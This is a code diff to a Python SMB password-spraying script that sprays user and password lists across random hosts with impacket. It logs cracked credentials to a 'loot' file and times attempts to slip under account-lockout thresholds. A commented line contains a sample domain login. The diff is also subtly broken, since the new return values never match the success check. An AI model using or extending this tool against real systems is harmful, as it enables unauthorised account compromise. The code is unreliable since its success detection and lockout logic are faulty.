@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, sys, random
+import argparse, sys, random, time
 import impacket
 from impacket.smbconnection import SMBConnection
 
@@ -10,10 +10,10 @@ def smb_login(target, domain, user, password):
     except:
         return False
     try:
-        smbclient.login(user, password, domain)
-        return 1  # Logon Success!
-    except:       # Logon Failure :/
-        return 2
+        smbclient._SMBConnection.login(user, password, domain)
+        return 'SUCCESS'  # Logon Success!
+    except Exception as e:       # Logon Failure :/
+        return str(e)
 
 def main():
     parser = argparse.ArgumentParser('spray_n_pray')
@@ -40,8 +40,8 @@ def main():
                 passwds = passfile.readlines()
                 passwds = [x.strip() for x in passwds]
             domain = args.domain
-            lockout_window = args.lockout_window
-            attempts = args.attempts
+            lockout_window = int(args.lockout_window)
+            attempts = int(args.attempts)
         except Exception as e:
             print(e)
             print('[-] --targets, --userlist, and --passlist must be line-separated files. Oh. And you need a --domain. You\'re probably missing something else too.')
@@ -71,25 +71,36 @@ def main():
     # Main logic
     #attempt = smb_login('127.0.0.1', 'corp.checkfree.com', 'jake', 'J@k3jake')
     lockout_seconds = lockout_window * 60
-    attempts = 0
+    tries = 0
     time_start = time.time()
     for password in passwds:
-        attempts += 1
-        print('[*] STATUS: Spraying with '+password)
+        tries += 1
+        print('[*] ['+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())+'] STATUS: Spraying with '+password)
+        single_target = False if len(targets) > 1 else True
+        rando_target = random.choice(targets)
         for user in users:
-            while rando_target == last_target:
-                rando_target = random.choice(targets)
-            attempt = smb_login(rando_target, domain, user, password)
-            if attempt and attempt == 1:
-                print('[+] SUCCESS: '+domain+'\\'+user+':'+password)
+            if not single_target:
+                last_target = rando_target
+                while rando_target == last_target:
+                    rando_target = random.choice(targets)
+            login = smb_login(rando_target, domain, user, password)
+            if login and login == 1:
+                print('[+] SUCCESS: '+domain+'\\'+user+':'+password+' on '+rando_target)
+                with open('spray_and_pray-loot.out','a') as outfile:
+                    outfile.write(domain+'\\'+user+':'+password+'\n')
+            #if login and login == 2:   # DEBUG
+            #    print('[+] FAILED: '+domain+'\\'+user+':'+password+' on '+rando_target)
             else:
+                print('[-] STATUS: Connection failed')
                 continue 
-                #print('connection failed')
-            last_target = rando_target
         time_end = time.time()
-        while (time_end - time_start) > lockout_seconds:
-            time.sleep(60)
-            time_end = time.time()
+        # If we get within 2 attempts of lockout window, sleep until window closed
+        if (attempts - tries) > 2:
+            while (time_end - time_start) < lockout_seconds:
+                print('[*] STATUS: Lockout approaching, sleeping for 60 seconds')
+                time.sleep(60)
+                time_end = time.time()
+            tries = 0   # lockout window reached, reset to 0
 
 if __name__ == "__main__":
     main()
